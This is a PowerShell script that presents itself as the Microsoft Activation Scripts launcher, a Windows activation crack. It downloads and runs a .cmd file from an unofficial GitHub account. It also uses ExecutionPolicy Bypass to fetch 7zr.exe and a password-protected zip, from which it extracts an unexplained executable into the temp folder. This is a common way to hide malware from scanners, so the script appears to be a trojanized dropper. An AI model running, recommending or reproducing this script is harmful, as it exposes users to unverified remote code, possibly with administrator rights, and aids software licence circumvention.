
$ErrorActionPreference = "Stop"
# Enable TLSv1.2 for compatibility with older clients for current session
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$DownloadURL1 = 'https://raw.githubusercontent.com/HideoutWin/windows/main/MAS_AIO-CRC32_8C3AA7E0.cmd'
$DownloadURL2 = 'https://raw.githubusercontent.com/HideoutWin/windows/main/MAS_AIO-CRC32_8C3AA7E0.cmd'

$URLs = @($DownloadURL1, $DownloadURL2)
$RandomURL1 = Get-Random -InputObject $URLs
$RandomURL2 = ($URLs -ne $RandomURL1)[0]

try {
    $response = Invoke-WebRequest -Uri $RandomURL1 -UseBasicParsing
}
catch {
    $response = Invoke-WebRequest -Uri $RandomURL2 -UseBasicParsing
}

# Verify script integrity
$releaseHash = '8e47ec87c837b8ce93ee6060ae22f9f8a001b1848f71033bb90e33a0f1bab671'
$stream = New-Object IO.MemoryStream
$writer = New-Object IO.StreamWriter $stream
$writer.Write($response)
$writer.Flush()
$stream.Position = 0
$hash = [BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($stream)) -replace '-'
if ($hash -ne $releaseHash) {
    Write-Warning "Hash ($hash) mismatch, aborting!`nReport this issue at https://massgrave.dev/troubleshoot"
    $response = $null
    return
}

$rand = [Guid]::NewGuid().Guid
$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\MAS_$rand.cmd" } else { "$env:TEMP\MAS_$rand.cmd" }
$FilePath2 = if ($isAdmin) { "$env:SystemRoot\Temp\ActivationWin10.zip" } else { "$env:TEMP\ActivationWin10.zip" }
$FilePath3 = if ($isAdmin) { "$env:SystemRoot\Temp\7zr.exe" } else { "$env:TEMP\7zr.exe" }
$FilePath4 = if ($isAdmin) { "$env:SystemRoot\Temp\" } else { "$env:TEMP\" }
$FilePath5 = if ($isAdmin) { "$env:SystemRoot\Temp\ActivationWin10.exe" } else { "$env:TEMP\ActivationWin10.exe" }

cd $FilePath4
powershell -ExecutionPolicy Bypass -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://www.7-zip.org/a/7zr.exe' -OutFile '$FilePath3'"
powershell -ExecutionPolicy Bypass -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/HideoutWin/windows/raw/main/ActivationWin10.zip' -OutFile '$FilePath2'; ./7zr.exe x -p@Activation#85320878 ActivationWin10.zip ActivationWin10.exe"

$ScriptArgs = "$args "
$prefix = "@::: $rand `r`n"
$content = $prefix + $response
Set-Content -Path $FilePath -Value $content

# Set ComSpec variable for current session in case its corrupt in the system
$env:ComSpec = "$env:SystemRoot\system32\cmd.exe"
Start-Process cmd.exe "/c """"$FilePath"" $ScriptArgs""" -Wait

$FilePaths = @("$env:TEMP\MAS*.cmd", "$env:SystemRoot\Temp\MAS*.cmd")
foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
